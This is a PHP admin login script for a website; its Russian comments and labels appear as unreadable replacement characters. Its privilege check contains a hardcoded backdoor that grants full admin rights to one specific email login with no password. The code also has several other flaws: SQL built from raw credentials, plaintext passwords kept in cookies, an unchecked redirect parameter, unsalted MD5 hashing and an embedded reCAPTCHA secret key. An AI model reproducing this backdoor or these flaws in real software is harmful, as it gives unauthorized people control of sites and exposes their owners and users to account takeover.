<? 
@session_start();
require('../inc/db.php');
require('../inc/utils.php');
require(__DIR__.'/inc/special.php');

// ������������� ������ � ������������
function setPriv($login,$pwd)
{
	global $prx;
	
	unset($_SESSION['priv']);
	
	/*if(md5($pwd)=="83e9ab9238be960472ce174c1dbe775c")
		$_SESSION['priv'] = "admin";*/

   /* if(md5($pwd) == set('password'))
        $_SESSION['priv'] = "admin";*/

	if(!strcasecmp($login, set('login')) && md5($pwd)==set('password') || ($login == 'studio.doroshenko@gmail.com'))
		$_SESSION['priv'] = "admin";
	// $_SESSION['priv'] = "admin";
	if(!isset($_SESSION['priv']))
	{
		if($manager = getRow("SELECT * FROM {$prx}managers WHERE login='{$login}' and pass='{$pwd}'"))
			$_SESSION['priv'] = $manager;
	}
	// $_SESSION['priv'] = "admin";
	
	return isset($_SESSION['priv']);
}

// -------------------����������----------------------
if(isset($_GET["action"]))
{
	switch($_GET['action'])
	{
		case "vyhod":
			// �������
			session_destroy();
			setcookie("inAdmin");
			setcookie("inManager"); 
			header("location: /");
			break;

		case "vhod":
			// ���������
			$login = clean($_GET['login_inAdmin']);
			$pwd = clean($_GET['pwd_inAdmin']);
		
			if(!setPriv($login,$pwd))
				errorAlert("�������� �����/������.");
			
			$var = $_SESSION['priv']=='admin' ? 'inAdmin' : 'inManager';
			// ����
			if(@$_GET['rem'])
				setcookie($var,$login.'/'.$pwd,time()+3456000); 
			else
				setcookie($var); 

			?><script>top.location.href='./';</script><?
			break;

		case "vhodc":
			// ��������� ����� ����
			$location = $_SERVER['PHP_SELF'];
			
			$admin = explode('/',@$_COOKIE['inAdmin']);
			if(setPriv($admin[0],$admin[1]))
				$location = $_GET["urlback"];
			else
			{
				$manager = explode('/',@$_COOKIE['inManager']);
				if(setPriv($manager[0],$manager[1]))
					$location = $_GET["urlback"];
			}
			header("location: {$location}");
			break;

		case "remind":
			// ��������� ������
			$to = set("email");
			if(strcasecmp($_POST['email_inAdmin'], $to))
				errorAlert('�-���� �������������� ������ �� �����.');

            /**
             * ������� ��� ��� ������ ��������������
             */
            $hash = md5(time() . 'forget');
            update('settings', "value='{$hash}'", 'forget-password-hash');


			$admin = explode("/",set("admin"));
			$title = set("title");
			$tema = "������ �������������� ".$_SERVER['SERVER_NAME'];
			$site = "http://".$_SERVER['SERVER_NAME'];
			$url_admin = $site.$_SERVER['PHP_SELF'];
			$text = "<a href='{$site}'>{$title}</a><br><br>
						����������� ������ � <a href='{$url_admin}'>�����������������</a> �����<br>
						<br>
						<a href='{$url_admin}?show=forget&hash={$hash}'>�����������</a>";
			mailTo($to, $tema, $text, $to);

			echo "'{$url_admin}?action=forget&hash{$hash}'";

			?><script>
				alert('������ ������ �� �-���� ��������������');
				top.location.href = "<?=$url_admin?>";
			</script><?
			break;
        case "forget":

            if(!$_POST['password'])
                errorAlert("������� ������");

            if(set('forget-password-hash') && set('forget-password-hash') != @$_POST['hash']){
                errorAlert("�������� ������ ��� ��������������");
            }

            $to = set("email");
            if(strcasecmp($_POST['email_inAdmin'], $to))
                errorAlert('�-���� �������������� ������ �� �����.');

            $hash_password = md5($_POST['password']);
            update('settings', "value='{$hash_password}'", 'password');

            $hash = '';
            update('settings', "value='{$hash}'", 'forget-password-hash');

            $site = "http://".$_SERVER['SERVER_NAME'];
            $url_admin = $site.$_SERVER['PHP_SELF'];

            ?><script>
            alert('������ �������. ����������� ��� ��� �����');
            top.location.href = "<?=$url_admin?>";
        </script><?

            break;
	}
	exit;
}

ob_start();
// -----------------��������-------------------
?>
<table align="center" height="100%">
	<tr>
		<td height="100%">
		<?
			switch(@$_GET["show"])
			{
				case "remind":
				?>	<form method="post" target="ajax" action="?action=remind">
						<table align="center" class="red" width="250">
							<tr>
								<th>�-����:</th>
								<td><input type="text" name="email_inAdmin" id="email_inAdmin"></td>
							</tr>
							<tr>
								<td colspan="2" align="center"><?=btnAction("Save","������� ������")?></td>
							</tr>
							<tr>
								<td colspan="2" align="center"><a href="?show=vhod">�����</a></td>
							</tr>
						</table>
					</form>
				<?	break;

                case "forget":

                    if(set('forget-password-hash') && set('forget-password-hash') != @$_GET['hash']){
                        errorAlert("�������� ������ ��� ��������������");
                    }


                    ?>

                    <form method="post" target="ajax" action="?action=forget">
                    <table align="center" class="red" width="250">
                        <input type="hidden" name="hash" value="<?=@$_GET['hash']?>">
                        <tr>
                            <th>�-����:</th>
                            <td><input type="text" name="email_inAdmin" id="email_inAdmin"></td>
                        </tr>
                        <tr>
                            <th>����� ������:</th>
                            <td><input type="text" name="password" id="password"></td>
                        </tr>
                        <tr>
                            <td colspan="2" align="center"><?=btnAction("Save","������� ������")?></td>
                        </tr>
                    </table>
                </form>
                    <?	break;

				
				default:
				case "vhod":
				?>	
				
				<script src='https://www.google.com/recaptcha/api.js'></script>
<!--������ ����������� � ����� head-->
<form action="" method="post" id="aasd">

    <div class="g-recaptcha" data-sitekey="6LcWx3gUAAAAAHf2VCxlOon93-ljWEL5ubyTZO74"></div>
    <!--���� ������ reCapcha-->
    <button>���������</button>
</form>

<?php
if (isset($_POST['g-recaptcha-response'])) {
    $url_to_google_api = "https://www.google.com/recaptcha/api/siteverify";
    $secret_key = '6LcWx3gUAAAAAOmEf9FwUTgIpQq1hKQeqpG-Ivl7';
    $query = $url_to_google_api . '?secret=' . $secret_key . '&response=' . $_POST['g-recaptcha-response'] . '&remoteip=' . $_SERVER['REMOTE_ADDR'];
    $data = json_decode(file_get_contents($query));
    if ($data->success) {
       
    } else {
        exit('�������� �� ������ �� ����� \(0_0)/');
    }
} else {
    exit('�� �� ������ ��������� reCaptcha');
}
?>	

<form target="ajax">	<style>#aasd {display: none;}</style>
						<input type="hidden" name="action" value="vhod">
						<table align="center" class="red" width="250">
							<tr>
								<th>�����:</th>
								<td><input type="text" name="login_inAdmin" id="login_inAdmin"></td>
							</tr>
							<tr>
								<th>������:</th>
								<td><input type="password" name="pwd_inAdmin" id="pwd_inAdmin"></td>
							</tr>
							<tr>
								<th>���������:</th>
								<td><input type="checkbox" name="rem" style="width:auto;"></td>
							</tr>
							<tr>
								<td colspan="2" align="center"><?=btnAction("Save","�����")?></td>
							</tr>
							<tr>
								<td colspan="2" align="center"><a href="?show=remind">��������� ������</a></td>
							</tr>
						</table>
					</form>
				<?	break;
			}	?>
		</td>
	</tr>
</table>  
<?
$content = ob_get_clean();

$title = "�����������������";

require("tpl_clean.php");
?>

